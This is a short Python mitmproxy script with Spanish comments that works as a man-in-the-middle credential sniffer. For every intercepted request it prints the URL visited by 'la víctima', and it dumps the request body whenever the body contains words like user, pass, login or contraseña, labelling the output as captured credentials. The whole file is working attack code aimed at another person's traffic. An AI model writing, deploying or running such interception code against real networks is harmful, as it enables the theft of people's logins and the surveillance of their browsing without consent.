#!/usr/bin/env python3 

# Importa las librerías necesarias para trabajar con HTTP y el análisis de URLs
from mitmproxy import http
from mitmproxy import ctx
from urllib.parse import urlparse

# Define una función para buscar palabras clave en los datos proporcionados
def has_kewywords(data, keywords):
    # Utiliza 'any' para verificar si alguna de las palabras clave está en los datos
    return any(keyword in data for keyword in keywords)

# Define la función que se ejecutará en cada solicitud HTTP capturada
def request(packet):
    # Obtiene la URL completa de la solicitud
    url = packet.request.url
    # Analiza la URL para separarla en sus componentes
    parsed_url = urlparse(url)
    # Obtiene el esquema (por ejemplo, http o https)
    scheme = parsed_url.scheme
    # Obtiene el dominio de la URL
    domain = parsed_url.netloc
    # Obtiene el camino de la URL (la parte después del dominio)
    path = parsed_url.path

    # Imprime la URL reconstruida para notificar sobre la visita del usuario
    print(f"[+] URL visitada por la víctima: {scheme}://{domain}{path}")

    # Lista de palabras clave a buscar en los datos de la solicitud que pueden indicar credenciales
    keywords = ["user", "pass", "login", "contraseña", "username", "mail"]
    # Obtiene el texto de la solicitud HTTP
    data = packet.request.get_text()

    # Si los datos de la solicitud contienen alguna de las palabras clave, imprime los datos
    if has_kewywords(data, keywords):
        print(f"\n[+] Posibles credenciales capturadas:\n\n{data}\n")
